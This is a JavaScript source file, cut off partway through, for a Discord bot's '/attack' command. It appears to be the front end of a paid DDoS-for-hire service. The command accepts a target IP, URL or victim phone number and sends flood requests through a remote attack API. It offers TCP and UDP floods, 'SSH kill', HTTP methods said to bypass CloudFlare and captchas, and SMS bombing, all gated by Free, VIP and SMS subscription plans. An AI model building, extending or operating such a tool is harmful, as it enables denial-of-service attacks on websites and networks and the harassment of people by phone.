const { ActionRowBuilder, ButtonBuilder, ButtonStyle, Events, SlashCommandBuilder, PermissionFlagsBits, EmbedBuilder } = require('discord.js');
const ayarlar = require('../../ayarlar.json');
const axios = require('axios');
const fs = require('fs');
const path = require('path');
const filePath = path.join(__dirname, '..', '..', 'database', 'users.txt');
const fileOngoing = path.join(__dirname, '..', '..', 'database', 'ongoing.txt');
const moment = require('moment');
require('moment-timezone');
var version = ayarlar.versionbot;
var img = ayarlar.img;
var maxConc = ayarlar.maxConc;
var BannedWords = ayarlar.blacklists;
var photovip = ayarlar.photovip;
var apiAttack = ayarlar.apiAttack;
const { exec } = require('child_process');
var randomgif = photovip[Math.floor((Math.random() * photovip.length))];

module.exports = {
    cooldown: 10,
    data: new SlashCommandBuilder()
    .setName('attack')
    .setDescription('Start attack')
    .addSubcommand(subcommand =>
        subcommand
            .setName('layer4')
            .setDescription('Tấn Công IP')
            .addStringOption(option => option
                .setName('methods')
                .setDescription('Phương thức tấn công')
                .setRequired(true)
                .addChoices(
                    { name: 'TCP ( TCP flood )', value: 'TCP' },
                    { name: 'TCP-LEGIT ( Real TCP flood )', value: 'TCP-LEGIT' },
                    { name: 'TCP-BYPASS ( TCP bypass )', value: 'TCP-BYPASS' },
                    { name: 'UDP ( UDP flood )', value: 'UDP' },
                    { name: 'GAME ( UDP FLOOD OPTIMIZED FOR HIGHER PP/S )', value: 'GAME' },
                    { name: 'SSH ( SSH kill )', value: 'SSH' },
                    { name: 'HOME ( HOME kill )', value: 'HOME' },
                ))
            .addStringOption(option => option
                .setName('host')
                .setDescription('Địa chỉ IP tấn công')
                .setMaxLength(60)
                .setRequired(true))
            .addNumberOption(option => option
                .setName('port')
                .setDescription('Port tấn công')
                .setMinValue(0)
                .setMaxValue(65535)
                .setRequired(true))
            .addNumberOption(option => option
                .setName('time')
                .setDescription('Thời gian tấn công')
                .setMinValue(0)
                .setMaxValue(300)
                .setRequired(false)))
    .addSubcommand(subcommand =>
        subcommand
            .setName('layer7')
            .setDescription('Tấn Công Web')
            .addStringOption(option => option
                .setName('methods')
                .setDescription('Phương thức tấn công')
                .setRequired(true)
                .addChoices(
                    { name: 'NUKED ( HTTP Strong Bypass | idk )', value: 'NUKED' },
                    { name: 'BYPASS ( Bypasses CloudFlare Protection )', value: 'BYPASS' },
                    { name: 'BROWSER ( Bypasses Captcha/UAM )', value: 'BROWSER' },
                ))
            .addStringOption(option => option
                .setName('host')
                .setDescription('Địa chỉ tấn công')
                .setMaxLength(60)
                .setRequired(true))
            .addNumberOption(option => option
                .setName('time')
                .setDescription('Thời gian tấn công')
                .setMinValue(0)
                .setMaxValue(300)
                .setRequired(false)))
    .addSubcommand(subcommand =>
        subcommand
            .setName('sms')
            .setDescription('Tấn Công SĐT')
            .addStringOption(option => option
                .setName('target')
                .setDescription('SĐT nạn nhân')
                .setMaxLength(11)
                .setRequired(true))
            .addNumberOption(option => option
                .setName('time')
                .setDescription('Thời gian tấn công')
                .setMinValue(0)
                .setMaxValue(300)
                .setRequired(false)))
    .addSubcommand(subcommand =>
        subcommand
            .setName('free')
            .setDescription('Tấn Công Free')
            .addStringOption(option => option
                .setName('methods')
                .setDescription('Phương thức tấn công')
                .setRequired(true)
                .addChoices(
                    { name: 'NUKED ( HTTP Strong Bypass | idk )', value: 'NUKED' },
                    { name: 'TCP ( TCP flood )', value: 'TCP' },
                ))
            .addStringOption(option => option
                .setName('host')
                .setDescription('Địa chỉ tấn công')
                .setMaxLength(60)
                .setRequired(true))
            .addNumberOption(option => option
                .setName('port')
                .setDescription('Port tấn công')
                .setMinValue(0)
                .setMaxValue(65535)
                .setRequired(false))
            .addNumberOption(option => option
                .setName('time')
                .setDescription('Thời gian tấn công')
                .setMinValue(0)
                .setMaxValue(300)
                .setRequired(false))),

    run: async (client, interaction, channel, options, async) => {
        fs.readFile(fileOngoing, 'utf8', (err, data) => {
        if (err) {
            console.error('Error while reading the database:', err);
            return interaction.reply('An error occurred while processing the command.');
        } else {
            const entries = data ? data.split('\n') : [];
            const userId = interaction.user.id;

            const userIdCount = entries.reduce((count, entry) => {
                const entryUserId = entry.split(' ')[0]; // Assuming the userId is the first part of the logMessage
                if (entryUserId === userId) {
                    return count + 1;
                }
                return count;
            }, 0);

            if (userIdCount >= 1) {
                interaction.reply({ content: `You have used 1/1 attacks. Please try again`, ephemeral: true });
                return;
            }

            const lines = data.split('\n');
            if (lines.length >= maxConc) {
                return interaction.reply({ content: `There are \`${maxConc}/${maxConc}\` ongoing attacks. You cannot attack right now.`, ephemeral: true });
            }

            const host = interaction.options.getString('host');
            const methods = interaction.options.getString('methods');
            const port = (interaction.options.getNumber('port') || '443');
            const time = (interaction.options.getNumber('time') || '60');

            if (BannedWords.some(word => interaction.toString().toLowerCase().includes(word))) {
              interaction.reply({
                embeds: [
                  new EmbedBuilder()
                    .setColor('Random')
                    .setDescription(`\`${host}\` is in the blacklist, so you cannot attack.`)
                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                    .setTimestamp(),
                ], ephemeral: true 
              });
              setTimeout(() => { interaction.deleteReply()}, 5000);
              return;
            }

            if (interaction.options.getSubcommand() === 'free') {
                fs.readFile(filePath, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Error when removing user information to the database:', err);
                    } else {
                        const userData = data.split('\n').find(entry => entry.startsWith(`${interaction.user.id} `));

                        if (userData) {
                            const [userId, plans, concurrents, attacktime, expirationTime] = userData.split(' ');

                            if (time > attacktime) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription(`You cannot launch an attack before **\`${attacktime}\`** as you have reached your attack time limit. Use \`/user info\` to see the attack time details.`)
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (!(plans === 'Free' || plans === 'Vip' || plans === 'Admin')) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription('You need to have the **`Free`** plan to use this command. If you don\'t have a free plan, use \`/getkey\` to obtain one.')
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (methods === 'NUKED') {

                                var chetmemay = methods

                                const regex = /^https:\/\/.+$/;
                                const isValidUrl = regex.test(host);

                                if (!isValidUrl) {
                                    interaction.reply({
                                    embeds: [
                                      new EmbedBuilder()
                                        .setColor('Random')
                                        .setTitle('Invalid host!')
                                        .setDescription('`Format: https://www.example.com/`')
                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                        .setTimestamp(),
                                    ], ephemeral: true 
                                  });
                                  setTimeout(() => { interaction.deleteReply()}, 5000);
                                  return;
                                }

                                async function fetchData() {
                                    try {
                                        const response = await axios.get(`${apiAttack}&host=${host}&port=${port}&time=${time}&method=${chetmemay}`)

                                        if (response.data) {
                                            const apiResponse = response.data.error;
                                            const reasonResponse = response.data.reason;

                                            if (apiResponse === true) {
                                                await interaction.reply({
                                                    embeds: [
                                                        new EmbedBuilder()
                                                        .setColor('Random')
                                                        .setTitle('**ERROR**')
                                                        .setDescription(`\n\`${reasonResponse}\`\n\nPlease try again!`)
                                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                        .setTimestamp(),
                                                    ], ephemeral: true 
                                                });
                                            } else {
                                                const embed = new EmbedBuilder()
                                                    .setColor('Random')
                                                    .setTitle(version)
                                                    .addFields(
                                                    {
                                                      name: "**`👨‍💻 User:`**",
                                                      value: ` [ ${interaction.user.username} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🔗 Host:`**",
                                                      value: ` [ ${host} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🚪 Port:`**",
                                                      value: ` [ ${port} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💥 Method:`**",
                                                      value: ` [ ${methods} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🕒 Time:`**",
                                                      value: ` [ ${time} seconds ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💸 Plan:`**",
                                                      value: ` [ FREE ] `,
                                                      inline: true,
                                                    })
                                                    .setImage(randomgif)
                                                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                    .setTimestamp();
                                                    interaction.user.send({ embeds: [embed] }).catch(async (err) => {
                                                        console.log(err)
                                                        return await interaction.reply({
                                                            content: `**ERROR**: It\'s not possible to send an attack.`, ephemeral: true
                                                        }).catch((err) => {})
                                                    })

                                                    await interaction.reply({
                                                        embeds: [
                                                          new EmbedBuilder()
                                                            .setColor('Random')
                                                            .setTitle(version)
                                                            .setDescription("```css\n[ ATTACK HAS BEEN SENT ]\n\```")
                                                            .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                            .setTimestamp(),
                                                        ], ephemeral: true 
                                                    }).catch((err) =>{})
                                                    setTimeout(() => { interaction.deleteReply()}, 5000);
                                                    const currentTime = Date.now();
                                                    const expirationTime = currentTime + time * 1000;
                                                    const logMessage = `${interaction.user.id} ${methods} ${host} ${expirationTime}`;
                                                    const maxHistoryEntries = 5;

                                                    fs.readFile(fileOngoing, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(fileOngoing, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });

                                                    const userHistory = path.join(__dirname, '..', '..', 'database', 'logs', `${interaction.user.id}.txt`);

                                                    if (!fs.existsSync(userHistory)) {
                                                        fs.writeFileSync(userHistory, '', 'utf8');
                                                    }

                                                    fs.readFile(userHistory, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const currentTime = moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss DD-MM-YYYY');
                                                        const logMessage = `${interaction.user.username}: Method: ${methods} | Target ${host}:${port} | Time: ${time} | Attack at: ${currentTime}\n`;

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(userHistory, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });
                                            }
                                        }
                                    } catch (error) {
                                        console.error('Lỗi khi gửi yêu cầu GET:', error);
                                        interaction.reply({ content: '**ERROR**: It\'s not possible to send an attack.', ephemeral: true });
                                    }
                                }
                                fetchData();
                            }

                            if (methods === 'TCP') {

                                var chetmemay = methods

                                const ipTarget = /(?:[0-9]{1,3}\.){3}[0-9]{1,3}/g;

                                if (!ipTarget.test(host)) {
                                    interaction.reply({
                                    embeds: [
                                      new EmbedBuilder()
                                        .setColor('Random')
                                        .setTitle('Invalid host!')
                                        .setDescription('`Format: 1.1.1.1`')
                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                        .setTimestamp(),
                                    ], ephemeral: true 
                                  });
                                  setTimeout(() => { interaction.deleteReply()}, 5000);
                                  return;
                                }

                                async function fetchData() {
                                    try {
                                        const response = await axios.get(`${apiAttack}&host=${host}&port=${port}&time=${time}&method=${chetmemay}`)

                                        if (response.data) {
                                            const apiResponse = response.data.error;
                                            const reasonResponse = response.data.reason;

                                            if (apiResponse === true) {
                                                await interaction.reply({
                                                    embeds: [
                                                        new EmbedBuilder()
                                                        .setColor('Random')
                                                        .setTitle('**ERROR**')
                                                        .setDescription(`\n\`${reasonResponse}\`\n\nPlease try again!`)
                                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                        .setTimestamp(),
                                                    ], ephemeral: true 
                                                });
                                            } else {
                                                const embed = new EmbedBuilder()
                                                    .setColor('Random')
                                                    .setTitle(version)
                                                    .addFields(
                                                    {
                                                      name: "**`👨‍💻 User:`**",
                                                      value: ` [ ${interaction.user.username} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🔗 Host:`**",
                                                      value: ` [ ${host} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🚪 Port:`**",
                                                      value: ` [ ${port} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💥 Method:`**",
                                                      value: ` [ ${methods} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🕒 Time:`**",
                                                      value: ` [ ${time} seconds ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💸 Plan:`**",
                                                      value: ` [ FREE ] `,
                                                      inline: true,
                                                    })
                                                    .setImage(randomgif)
                                                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                    .setTimestamp();
                                                    interaction.user.send({ embeds: [embed] }).catch(async (err) => {
                                                        console.log(err)
                                                        return await interaction.reply({
                                                            content: `**ERROR**: It\'s not possible to send an attack.`, ephemeral: true
                                                        }).catch((err) => {})
                                                    })

                                                    await interaction.reply({
                                                        embeds: [
                                                          new EmbedBuilder()
                                                            .setColor('Random')
                                                            .setTitle(version)
                                                            .setDescription("```css\n[ ATTACK HAS BEEN SENT ]\n\```")
                                                            .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                            .setTimestamp(),
                                                        ], ephemeral: true 
                                                    }).catch((err) =>{})
                                                    setTimeout(() => { interaction.deleteReply()}, 5000);
                                                    const currentTime = Date.now();
                                                    const expirationTime = currentTime + time * 1000;
                                                    const logMessage = `${interaction.user.id} ${methods} ${host} ${expirationTime}`;
                                                    const maxHistoryEntries = 5;

                                                    fs.readFile(fileOngoing, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(fileOngoing, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });

                                                    const userHistory = path.join(__dirname, '..', '..', 'database', 'logs', `${interaction.user.id}.txt`);

                                                    if (!fs.existsSync(userHistory)) {
                                                        fs.writeFileSync(userHistory, '', 'utf8');
                                                    }

                                                    fs.readFile(userHistory, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const currentTime = moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss DD-MM-YYYY');
                                                        const logMessage = `${interaction.user.username}: Method: ${methods} | Target ${host}:${port} | Time: ${time} | Attack at: ${currentTime}\n`;

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(userHistory, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });
                                            }
                                        }
                                    } catch (error) {
                                        console.error('Lỗi khi gửi yêu cầu GET:', error);
                                        interaction.reply({ content: '**ERROR**: It\'s not possible to send an attack.', ephemeral: true });
                                    }
                                }
                                fetchData();
                            }


                        } else {
                            interaction.reply({
                              embeds: [
                              new EmbedBuilder()
                                  .setColor('Random')
                                  .setTitle(`ERROR`)
                                  .setDescription('You need to have the **`Free`** plan to use this command. If you don\'t have a free plan, use \`/getkey\` to obtain one.')
                                ], ephemeral: true
                            });
                        }
                    }
                });
            }

            if (interaction.options.getSubcommand() === 'layer4') {
                fs.readFile(filePath, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Error when removing user information to the database:', err);
                    } else {
                        const userData = data.split('\n').find(entry => entry.startsWith(`${interaction.user.id} `));

                        if (userData) {
                            const [userId, plans, concurrents, attacktime, expirationTime] = userData.split(' ');

                            if (time > attacktime) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription(`You cannot launch an attack before **\`${attacktime}\`** as you have reached your attack time limit. Use \`/user info\` to see the attack time details.`)
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (!(plans === 'Vip' || plans === 'Admin')) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription('You need to have the **`Vip`** plan to use this command.')
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (methods === 'TCP' || methods === 'UDP' || methods === 'GAME' || methods === 'HOME' || methods === 'SSH' || methods === 'TCP-LEGIT' || methods === 'TCP-BYPASS') {

                                var chetmemay = methods

                                const ipTarget = /(?:[0-9]{1,3}\.){3}[0-9]{1,3}/g;

                                if (!ipTarget.test(host)) {
                                    interaction.reply({
                                    embeds: [
                                      new EmbedBuilder()
                                        .setColor('Random')
                                        .setTitle('Invalid host!')
                                        .setDescription('`Format: 1.1.1.1`')
                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                        .setTimestamp(),
                                    ], ephemeral: true 
                                  });
                                  setTimeout(() => { interaction.deleteReply()}, 5000);
                                  return;
                                }

                                async function fetchData() {
                                    try {
                                        const response = await axios.get(`${apiAttack}&host=${host}&port=${port}&time=${time}&method=${chetmemay}`)

                                        if (response.data) {
                                            const apiResponse = response.data.error;
                                            const reasonResponse = response.data.reason;

                                            if (apiResponse === true) {
                                                await interaction.reply({
                                                    embeds: [
                                                        new EmbedBuilder()
                                                        .setColor('Random')
                                                        .setTitle('**ERROR**')
                                                        .setDescription(`\n\`${reasonResponse}\`\n\nPlease try again!`)
                                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                        .setTimestamp(),
                                                    ], ephemeral: true 
                                                });
                                            } else {
                                                const embed = new EmbedBuilder()
                                                    .setColor('Random')
                                                    .setTitle(version)
                                                    .addFields(
                                                    {
                                                      name: "**`👨‍💻 User:`**",
                                                      value: ` [ ${interaction.user.username} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🔗 Host:`**",
                                                      value: ` [ ${host} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🚪 Port:`**",
                                                      value: ` [ ${port} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💥 Method:`**",
                                                      value: ` [ ${methods} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🕒 Time:`**",
                                                      value: ` [ ${time} seconds ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💸 Plan:`**",
                                                      value: ` [ VIP ] `,
                                                      inline: true,
                                                    })
                                                    .setImage(randomgif)
                                                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                    .setTimestamp();
                                                    interaction.user.send({ embeds: [embed] }).catch(async (err) => {
                                                        console.log(err)
                                                        return await interaction.reply({
                                                            content: `**ERROR**: It\'s not possible to send an attack.`, ephemeral: true
                                                        }).catch((err) => {})
                                                    })

                                                    await interaction.reply({
                                                        embeds: [
                                                          new EmbedBuilder()
                                                            .setColor('Random')
                                                            .setTitle(version)
                                                            .setDescription("```css\n[ ATTACK HAS BEEN SENT ]\n\```")
                                                            .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                            .setTimestamp(),
                                                        ], ephemeral: true 
                                                    }).catch((err) =>{})
                                                    setTimeout(() => { interaction.deleteReply()}, 5000);
                                                    const currentTime = Date.now();
                                                    const expirationTime = currentTime + time * 1000;
                                                    const logMessage = `${interaction.user.id} ${methods} ${host} ${expirationTime}`;
                                                    const maxHistoryEntries = 5;

                                                    fs.readFile(fileOngoing, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(fileOngoing, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });

                                                    const userHistory = path.join(__dirname, '..', '..', 'database', 'logs', `${interaction.user.id}.txt`);

                                                    if (!fs.existsSync(userHistory)) {
                                                        fs.writeFileSync(userHistory, '', 'utf8');
                                                    }

                                                    fs.readFile(userHistory, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const currentTime = moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss DD-MM-YYYY');
                                                        const logMessage = `${interaction.user.username}: Method: ${methods} | Target ${host}:${port} | Time: ${time} | Attack at: ${currentTime}\n`;

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(userHistory, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });
                                            }
                                        }
                                    } catch (error) {
                                        console.error('Lỗi khi gửi yêu cầu GET:', error);
                                        interaction.reply({ content: '**ERROR**: It\'s not possible to send an attack.', ephemeral: true });
                                    }
                                }
                                fetchData();
                            }

                        } else {
                            interaction.reply({
                              embeds: [
                              new EmbedBuilder()
                                  .setColor('Random')
                                  .setTitle(`ERROR`)
                                  .setDescription('You need to have the **`Free`** plan to use this command. If you don\'t have a free plan, use \`/getkey\` to obtain one.')
                                ], ephemeral: true
                            });
                        }
                    }
                });
            }

            if (interaction.options.getSubcommand() === 'layer7') {
                fs.readFile(filePath, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Error when removing user information to the database:', err);
                    } else {
                        const userData = data.split('\n').find(entry => entry.startsWith(`${interaction.user.id} `));

                        if (userData) {
                            const [userId, plans, concurrents, attacktime, expirationTime] = userData.split(' ');

                            if (time > attacktime) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription(`You cannot launch an attack before **\`${attacktime}\`** seconds as you have reached your attack time limit. Use \`/user info\` to see the attack time details.`)
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (!(plans === 'Vip' || plans === 'Admin')) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription('You need to have the **`Vip`** plan to use this command.')
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (methods === 'NUKED' || methods === 'BYPASS' || methods === 'BROWSER') {

                                var chetmemay = methods

                                const regex = /^https:\/\/.+$/;
                                const isValidUrl = regex.test(host);

                                if (!isValidUrl) {
                                    interaction.reply({
                                    embeds: [
                                      new EmbedBuilder()
                                        .setColor('Random')
                                        .setTitle('Invalid host!')
                                        .setDescription('`Format: https://www.example.com/`')
                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                        .setTimestamp(),
                                    ], ephemeral: true 
                                  });
                                  setTimeout(() => { interaction.deleteReply()}, 5000);
                                  return;
                                }

                                async function fetchData() {
                                    try {
                                        const response = await axios.get(`${apiAttack}&host=${host}&port=${port}&time=${time}&method=${chetmemay}`)

                                        if (response.data) {
                                            const apiResponse = response.data.error;
                                            const reasonResponse = response.data.reason;

                                            if (apiResponse === true) {
                                                await interaction.reply({
                                                    embeds: [
                                                        new EmbedBuilder()
                                                        .setColor('Random')
                                                        .setTitle('**ERROR**')
                                                        .setDescription(`\n\`${reasonResponse}\`\n\nPlease try again!`)
                                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                        .setTimestamp(),
                                                    ], ephemeral: true 
                                                });
                                            } else {
                                                const embed = new EmbedBuilder()
                                                    .setColor('Random')
                                                    .setTitle(version)
                                                    .addFields(
                                                    {
                                                      name: "**`👨‍💻 User:`**",
                                                      value: ` [ ${interaction.user.username} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🔗 Host:`**",
                                                      value: ` [ ${host} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🚪 Port:`**",
                                                      value: ` [ ${port} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💥 Method:`**",
                                                      value: ` [ ${methods} ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`🕒 Time:`**",
                                                      value: ` [ ${time} seconds ] `,
                                                      inline: true,
                                                    },
                                                    {
                                                      name: "**`💸 Plan:`**",
                                                      value: ` [ VIP ] `,
                                                      inline: true,
                                                    })
                                                    .setImage(randomgif)
                                                    .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                    .setTimestamp();
                                                    interaction.user.send({ embeds: [embed] }).catch(async (err) => {
                                                        console.log(err)
                                                        return await interaction.reply({
                                                            content: `**ERROR**: It\'s not possible to send an attack.`, ephemeral: true
                                                        }).catch((err) => {})
                                                    })

                                                    await interaction.reply({
                                                        embeds: [
                                                          new EmbedBuilder()
                                                            .setColor('Random')
                                                            .setTitle(version)
                                                            .setDescription("```css\n[ ATTACK HAS BEEN SENT ]\n\```")
                                                            .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                                            .setTimestamp(),
                                                        ], ephemeral: true 
                                                    }).catch((err) =>{})
                                                    setTimeout(() => { interaction.deleteReply()}, 5000);
                                                    const currentTime = Date.now();
                                                    const expirationTime = currentTime + time * 1000;
                                                    const logMessage = `${interaction.user.id} ${methods} ${host} ${expirationTime}`;
                                                    const maxHistoryEntries = 5;

                                                    fs.readFile(fileOngoing, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(fileOngoing, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });

                                                    const userHistory = path.join(__dirname, '..', '..', 'database', 'logs', `${interaction.user.id}.txt`);

                                                    if (!fs.existsSync(userHistory)) {
                                                        fs.writeFileSync(userHistory, '', 'utf8');
                                                    }

                                                    fs.readFile(userHistory, 'utf8', (err, data) => {
                                                        if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        } else {

                                                        const currentTime = moment().tz('Asia/Ho_Chi_Minh').format('HH:mm:ss DD-MM-YYYY');
                                                        const logMessage = `${interaction.user.username}: Method: ${methods} | Target ${host}:${port} | Time: ${time} | Attack at: ${currentTime}\n`;

                                                        const entries = data ? data.split('\n') : [];
                                                        entries.unshift(logMessage); // Add the new logMessage at the beginning of the entries array

                                                        const updatedContent = entries.slice(0, maxHistoryEntries).join('\n');

                                                        fs.writeFile(userHistory, updatedContent, 'utf8', (err) => {
                                                            if (err) {
                                                            console.error('Error when reading user information from the database:', err);
                                                            return;
                                                        }
                                                        });
                                                    }
                                                    });
                                            }
                                        }
                                    } catch (error) {
                                        console.error('Lỗi khi gửi yêu cầu GET:', error);
                                        interaction.reply({ content: '**ERROR**: It\'s not possible to send an attack.', ephemeral: true });
                                    }
                                }
                                fetchData();
                            }

                        } else {
                            interaction.reply({
                              embeds: [
                              new EmbedBuilder()
                                  .setColor('Random')
                                  .setTitle(`ERROR`)
                                  .setDescription('You need to have the **`Free`** plan to use this command. If you don\'t have a free plan, use \`/getkey\` to obtain one.')
                                ], ephemeral: true
                            });
                        }
                    }
                });
            }

            if (interaction.options.getSubcommand() === 'sms') {
                fs.readFile(filePath, 'utf8', (err, data) => {
                    if (err) {
                        console.error('Error when removing user information to the database:', err);
                    } else {
                        const userData = data.split('\n').find(entry => entry.startsWith(`${interaction.user.id} `));

                        if (userData) {
                            const [userId, plans, concurrents, attacktime, expirationTime] = userData.split(' ');

                            if (time > attacktime) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription(`You cannot launch an attack before **\`${attacktime}\`** seconds as you have reached your attack time limit. Use \`/user info\` to see the attack time details.`)
                                    ], ephemeral: true
                                });
                                return;
                            }

                            if (!(plans === 'SmS' || plans === 'Vip' || plans === 'Admin')) {
                                interaction.reply({
                                  embeds: [
                                  new EmbedBuilder()
                                      .setColor('Random')
                                      .setTitle(`ERROR`)
                                      .setDescription('You need to have the **`SmS`** plan to use this command.')
                                    ], ephemeral: true
                                });
                                return;
                            }

                            const methods = 'SMS'

                            const host = interaction.options.getString('target');

                            if (methods === 'SMS') {

                                var chetmemay = methods

                                const regex = /^\d{10}$/;
                                const isValidUrl = regex.test(host);

                                if (!isValidUrl) {
                                    interaction.reply({
                                    embeds: [
                                      new EmbedBuilder()
                                        .setColor('Random')
                                        .setTitle('Invalid phone!')
                                        .setDescription('`Format: 03370*****`')
                                        .setFooter({ text: "© Developer: HuyXingum8K#4557", iconURL: img })
                                        .setTimestamp(),
